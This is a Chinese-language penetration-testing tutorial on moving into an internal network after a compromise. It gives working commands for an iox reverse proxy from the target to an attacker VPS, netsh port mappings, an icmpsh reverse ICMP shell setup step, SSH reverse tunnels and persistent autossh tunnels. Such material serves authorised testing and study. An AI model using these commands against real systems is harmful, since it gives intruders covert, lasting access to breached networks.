0x01:工具介绍

IOX

Iox是一款功能强大的端口转发&内网代理工具，该工具的功能类似于lcx和ew，但是Iox的功能和性能都更加强大。
工具特性:
1、流量加密（可选） 2、友好的命令行参数 3、逻辑优化 4、UDP流量转发
工具下载https://github.com/EddieIvan01/iox
该工具具有两种工作模式
1:Fwd
监听0.0.0.0:8888和0.0.0.0:9999，两个端口间流量转发
iox fwd -l 8888 -l 9999
Proxy
目标机器操作
./iox proxy -r vps地址:9999


vps操作
./iox proxy -l 9999 -l 1080       // 注意，这两个端口是有顺序的

 


代理vps的1080端口即可通信内网机器

0x03:端口映射工具:Netsh

Netsh是windows下自带的命令行工具，可以用来端口映射

下面是一些常用的参数介绍:
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
·listenaddress -- 等待连接的本地ip地址
·listenport -- 本地监听的TCP端口（待转发）
·connectaddress -- 被转发端口的本地或者远程主机的ip地址
·connectport -- 被转发的端口
 
netsh interface portproxy add v4tov4 listenaddress=web服务器地址 listenport=8080 connectaddress=内网服务器地址 connectport=80 #新建一个端口映射，将web的8080端口和内网的80端口做个映射
netsh interface portproxy show all  #查看端口映射
netsh interface portproxy delete v4tov4 listenaddress=web服务器 listenport=8080 #删除端口映射
当连接web服务器的8080端口时即访问内网服务器的80端口



0x04:反向ICMP_shell:Icmpsh

当你已经从外网打到内网拿到shell的时候，可能目前的shell不是来自TCP的reverse shell。所以不考虑绑定shell。然而有关UDP，通常是一个DNS隧道或通过ICMP的渠道来获得一个reverse shell。而ICMP就是这个工具的重点。icmpsh是一个简单的 reverse ICMP shell
首先关闭icmp回复
sysctl -w net.ipv4.icmp_echo_ignore_all=1

0x05:ssh隧道

ssh端口转发需要修改/etc/ssh/sshd_config配置文件，将GatewayPorts修改为yes
-f 后台执行ssh指令
-C 允许压缩数据
-N 不执行远程指令
-R 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口
-L 本地端口转发
-D 动态端口转发
ssh本地端口转发
ssh -fCNL *:16379:localhost:6379 localhost
监听本地的16379端口，16379端口流量转发给6379端口
SSH反向隧道
隧道两侧都必须是linux服务器.
A机器操作
ssh -fCNR 192.168.134.130:8888:localhost:22 root@192.168.134.130 #意思就是将A机器的22号端口的流量都转发给B机器的8888端口
B机器操作
ssh -fCNL *:1234:localhost:8888 localhost #意思就是将本地监听的1234端口的流量都转发给本地的8888端口
C机器操作
ssh -p 1234 root@100.x.10.12 #ssh连接到公网服务器的1234端口
隧道会连接超时断开

用autossh建立稳定隧道

安装autossh：yum install autossh
autossh的参数与ssh的参数是一致的，但是不同的是，在隧道断开的时候，autossh会自动重新连接而ssh不会。另外不同的是我们需要指出的-M参数，这个参数指定一个端口，这个端口是外网的B机器用来接收内网A机器的信息，如果隧道不正常而返回给A机器让他实现重新连接。
